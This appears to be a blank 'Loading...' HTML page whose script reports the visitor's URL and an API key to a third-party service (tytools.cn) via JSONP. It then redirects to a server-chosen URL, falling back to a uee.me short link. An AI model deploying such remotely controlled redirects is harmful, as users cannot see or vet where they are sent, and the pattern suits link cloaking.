<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>加载中...</title>
<script type="text/javascript">
ajax({  
	  url: 'https://public.tytools.cn/report.act',  // 请求地址
	 jsonp: 'jjjcallback', // 采用jsonp请求，且回调函数名为"jsonpCallbak"，可以设置为合法的字符串
	 data : {
			"key" : "be09c5a8-93b3-4670-9bb4-e0ebaeb3de68",
			"type" : 1,
			"url" : encodeURIComponent(location.href)
		},
		success:function(msg){
			if (msg.code == "200") {
				openUrl(getRealUrl(msg));
			} else {
				openUrl("http://uee.me/scvg");
			}
		},
		error : function(e) {
			openUrl("http://uee.me/scvg");
		}
	});
	function openUrl(url) {
		location.href = url;
	}
	function getRealUrl(msg) {
		var url = msg.url;
		if (url.indexOf("&") == -1) {
			url += "?time=" + new Date().getTime();
		}
		url += "&id=" + msg.id;
		url += "&key=" + msg.key;
		url += "&reqSeq=" + msg.req_seq;
		return url;
	}
	function ajax(params) {  
		 params = params || {};  
		 params.data = params.data || {};  
		 var json = params.jsonp ? jsonp(params) : json(params);   
		 // jsonp请求  
		 function jsonp(params) {  
		  //创建script标签并加入到页面中  
		  var callbackName = params.jsonp;  
		  var head = document.getElementsByTagName('head')[0];  
		  // 设置传递给后台的回调参数名  
		  params.data['callback'] = callbackName;  
		  var data = formatParams(params.data);  
		  var script = document.createElement('script');  
		  head.appendChild(script);  
		  //创建jsonp回调函数  
		  window[callbackName] = function(json) {  
		  head.removeChild(script);  
		  clearTimeout(script.timer);  
		  window[callbackName] = null;  
		  params.success && params.success(json);  
		  };  
		　　//发送请求  
		  script.src = params.url + '?' + data;  
		  //为了得知此次请求是否成功，设置超时处理  
		  if(params.time) {  
		   script.timer = setTimeout(function() {  
		    window[callbackName] = null;  
		    head.removeChild(script);  
		    params.error && params.error({  
		     message: '超时' 
		    });  
		   }, time);  
		  }  
		 };  
		 //格式化参数  
		 function formatParams(data) {  
		  var arr = [];  
		  for(var name in data) {  
		   arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));  
		  };  
		  // 添加一个随机数，防止缓存  
		  arr.push('v=' + random()); 
		  return arr.join('&');  
		 }  
		 // 获取随机数  
		 function random() {  
		  return Math.floor(Math.random() * 10000 + 500);  
		 }
		}

		function getParam() {
			var url = location.search; // 获取url中"?"符后的字串
			var theRequest = new Object();
			if (url.indexOf("?") != -1) {
				var str = url.substr(1);
				strs = str.split("&");
				for (var i = 0; i < strs.length; i++) {
					theRequest[strs[i].split("=")[0]] = decodeURIComponent(strs[i]
							.split("=")[1]);
				}
			}
			return theRequest;
		}
</script>
</head>
<body>
</body>
</html>
